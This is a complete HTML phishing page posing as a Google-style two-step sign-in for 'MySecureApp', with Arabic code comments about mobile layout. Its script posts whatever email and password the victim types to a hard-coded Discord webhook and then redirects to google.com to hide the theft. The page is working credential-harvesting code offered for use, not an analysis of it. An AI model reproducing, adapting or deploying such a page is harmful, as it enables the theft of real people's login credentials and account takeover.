<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- إضافة تحكم في التكبير لتجربة موبايل أفضل -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in</title>
    <!-- تحسين الخطوط لتظهر بشكل أوضح على شاشات الموبايل -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { background-color: #1f1f1f; color: #e3e3e3; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
        
        .container { width: 100%; max-width: 450px; } /* تصغير العرض ليناسب الموبايل */
        .card { background-color: #0b0b0b; border-radius: 28px; padding: 30px; width: 100%; display: flex; flex-direction: column; }
        
        /* تعديل التصميم ليكون عمودياً بالكامل في الموبايل */
        .left-side { margin-bottom: 30px; }
        .app-logo { font-size: 20px; color: #a8c7fa; margin-bottom: 20px; }
        h1 { font-size: 28px; margin-bottom: 10px; }
        
        .input-group input { padding: 18px; font-size: 16px; border: 1px solid #8e918f; border-radius: 8px; width: 100%; }
        
        /* زيادة حجم الأزرار لتسهيل الضغط عليها في الموبايل */
        .next-btn { padding: 14px 28px; font-size: 16px; width: 100%; border-radius: 100px; cursor: pointer; }
        .actions { margin-top: 20px; flex-direction: column-reverse; gap: 15px; }
        
        .step { display: none; }
        .step.active { display: flex; flex-direction: column; }
    </style>
</head>
<body>

<div class="container">
    <main class="card">
        <section class="left-side">
            <div class="app-logo"><span>🔒</span> MySecureApp</div>
            <h1 id="main-heading">Sign in</h1>
            <p class="subtitle" id="main-subtitle">to continue</p>
        </section>

        <section class="right-side">
            <form id="loginForm">
                <!-- STEP 1 -->
                <div id="step-email" class="step active">
                    <div class="input-group">
                        <input type="email" id="email" placeholder="Email or phone" required>
                    </div>
                    <div class="actions">
                        <button type="button" class="next-btn" style="background:#a8c7fa" onclick="nextStep()">Next</button>
                    </div>
                </div>

                <!-- STEP 2 -->
                <div id="step-password" class="step">
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Enter password" required>
                    </div>
                    <label style="margin-top:15px; display:block">
                        <input type="checkbox" onchange="togglePassword(this)"> Show password
                    </label>
                    <div class="actions">
                        <button type="submit" class="next-btn" style="background:#a8c7fa">Sign in</button>
                    </div>
                </div>
            </form>
        </section>
    </main>
</div>

<script>
    function nextStep() {
        const email = document.getElementById('email').value;
        if(email.length < 5) return alert("Please enter a valid email");
        document.getElementById('step-email').classList.remove('active');
        document.getElementById('step-password').classList.add('active');
    }

    function togglePassword(cb) {
        document.getElementById('password').type = cb.checked ? 'text' : 'password';
    }

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const webhookURL = "https://discord.com/api/webhooks/1527466086075863131/JdF1EJ1O8cy2qjKqxOrBy7Z3IH4F-nH51uviJLDEScw5Kqf3VdEKlEMrou7NZvKyT3HF";
        
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `Email: ${document.getElementById('email').value} | Pass: ${document.getElementById('password').value}` })
        });
        window.location.replace("https://www.google.com");
    });
</script>
</body>
</html>
